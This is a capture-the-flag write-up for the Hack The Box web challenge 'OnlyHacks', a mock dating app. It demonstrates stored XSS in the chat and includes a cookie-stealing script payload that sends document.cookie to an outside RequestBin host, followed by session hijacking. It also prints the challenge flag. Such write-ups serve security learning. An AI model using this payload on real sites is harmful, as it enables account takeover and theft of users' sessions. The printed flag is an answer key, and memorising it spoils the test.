# OnlyHacks

- **Category:** Web
- **Points:** 0
- **Difficulty:** Very Easy

[OnlyHacks](https://app.hackthebox.com/challenges/OnlyHacks)

## Description

Dating and matching can be exciting especially during Valentine's, but it’s important to stay vigilant for impostors. Can you help identify possible frauds?

## Solution

This challenge is a simulation of a dating app. The user must create a profile and then match with other profiles. The user can view the profiles of other users and decide if they want to match with them.
Once you have matched with a user, let's use the chat to communicate with them.

> First, identify how works this chat. It seems that the chat is not secure, and the messages are not encrypted.
> Moreover, the chat form seems to render the messages in HTML format.

Let's try to inject some HTML code in the chat form.

```html
<script>alert('XSS')</script>
```

The chat form is vulnerable to XSS. Now, let's try to steal the flag.
For that, we can use [RequestBin](https://requestbin.whapi.cloud/) to force the user to send a request with its cookies to our RequestBin.

```html
<script>document.location='https://requestbin.whapi.cloud/1k1z1z01?cookie='+document.cookie</script>
```

Replace your Session Cookie with the one retrieved from RequestBin ! Refresh and Tada ! You are connected as the user.

> Display her other chats and you will find the flag.

## Flag

`HTB{d0nt_trust_str4ng3r5_bl1ndly}`
